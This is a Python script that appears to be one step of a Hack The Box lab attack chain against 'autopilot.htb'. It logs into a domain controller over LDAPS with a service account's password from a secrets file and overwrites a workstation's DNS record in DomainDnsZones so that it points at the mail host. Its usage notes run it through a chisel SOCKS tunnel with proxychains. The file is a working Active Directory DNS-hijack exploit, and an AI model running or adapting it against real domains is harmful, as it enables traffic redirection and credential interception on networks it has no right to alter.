#!/usr/bin/env python3
"""Replace ws01 A (DomainDnsZones) with the mail host.

dnsRecord: little-endian fields except TTL (big-endian).
Run through SOCKS after 04-chisel:

    set -a && . ../secrets.env && set +a
    proxychains4 -q -f /tmp/pc.conf python3 06-dns-hijack.py
"""
from __future__ import annotations

import os
import socket
import ssl
import struct

from ldap3 import MODIFY_REPLACE, Connection, Server, Tls

TARGET_IP = os.environ.get("MAIL_INT", "172.16.20.10")
DC = os.environ.get("DC01", "172.16.20.1")
DOMAIN = os.environ.get("DOMAIN", "autopilot.htb")
USER = os.environ.get("SA_USER", "sa-joshua.harris") + "@" + DOMAIN
PASS = os.environ["SA_PASS"]
DN = os.environ.get(
    "WS01_DNS_DN",
    "DC=ws01,DC=autopilot.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=autopilot,DC=htb",
)


def parse(blob: bytes):
    dl, typ = struct.unpack_from("<HH", blob, 0)
    ver, rank = blob[4], blob[5]
    flags, serial = struct.unpack_from("<HL", blob, 6)
    ttl = struct.unpack_from(">L", blob, 12)[0]
    reserved, ts = struct.unpack_from("<LL", blob, 16)
    ip = socket.inet_ntoa(blob[24:28]) if len(blob) >= 28 else "?"
    print(f"  DataLength={dl} Type={typ} Ver={ver} Rank={hex(rank)} Serial={serial} TTL={ttl} IP={ip}")
    return ver, rank, flags, serial, ttl, reserved, ts


def build(ver, rank, flags, serial, ttl, reserved, ts, ip):
    rec = struct.pack("<HHBBHL", 4, 1, ver, rank, flags, serial)
    rec += struct.pack(">L", ttl)
    rec += struct.pack("<LL", reserved, ts)
    rec += socket.inet_aton(ip)
    return rec


def main() -> None:
    tls = Tls(validate=ssl.CERT_NONE)
    server = Server(DC, port=636, use_ssl=True, tls=tls, get_info=None)
    conn = Connection(server, user=USER, password=PASS, authentication="SIMPLE", auto_bind=True)
    conn.search(DN, "(objectClass=*)", search_scope="BASE", attributes=["dnsRecord"])
    print("BEFORE", conn.entries)
    raw = conn.response[0]["raw_attributes"]["dnsRecord"][0]
    ver, rank, flags, serial, ttl, reserved, ts = parse(raw)
    blob = build(ver, rank, flags, serial, ttl, reserved, ts, TARGET_IP)
    ok = conn.modify(DN, {"dnsRecord": [(MODIFY_REPLACE, [blob])]})
    print("modify", ok, conn.result)
    conn.search(DN, "(objectClass=*)", search_scope="BASE", attributes=["dnsRecord"])
    print("AFTER", conn.entries)
    parse(conn.response[0]["raw_attributes"]["dnsRecord"][0])
    conn.unbind()


if __name__ == "__main__":
    main()
